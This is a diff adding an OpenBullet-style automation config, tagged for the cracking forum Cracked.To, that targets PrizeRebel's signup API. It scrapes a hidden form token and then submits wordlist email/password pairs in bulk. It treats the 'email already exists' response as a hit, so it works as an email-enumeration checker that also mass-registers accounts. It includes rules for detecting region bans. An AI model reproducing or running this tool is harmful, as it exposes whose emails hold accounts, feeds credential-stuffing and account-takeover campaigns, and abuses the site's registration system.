@@ -1,0 +1,50 @@
+[SETTINGS]
+{
+  "Name": "PrizeRebel-Reg",
+  "SuggestedBots": 1,
+  "LastModified": "2019-02-28T20:32:42.0767815+01:00",
+  "AdditionalInfo": "",
+  "Author": "",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Created_With REQUEST GET "https://www.prizerebel.com/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#♥ PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"uuid\" value=\"" "\"" Recursive=FALSE -> VAR "TOKEN" "" "" 
+#For_>> REQUEST POST "https://www.prizerebel.com/api/signup.php" AutoRedirect=TRUE 
+  CONTENT "joinEvent=standardJoin&action=signup&fbToken=&fbID=&signed_request=&r=&uuid=<TOKEN>&facebook_flag=&firstName=sina&lastName=koni&email=<USER>&password=<PASS>&r=&eu_opt%5Bcountry%5D=DE&eu_opt%5Bterms%5D=1&eu_opt%5Bprivacy%5D=1" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "origin: https://www.prizerebel.com" 
+  HEADER "referer: https://www.prizerebel.com/" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+#Cracked.To KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "This email address already exists in our database" 
+  KEYCHAIN Failure OR 
+    KEY "{\"response\":\"success" 
+    KEY "Password must be at least 6 characters in length" 
+  KEYCHAIN Ban OR 
+    KEY "Unfortunately, PrizeRebel.com is not available for your location" 
+    KEY "We are not accepting signups from your location" 
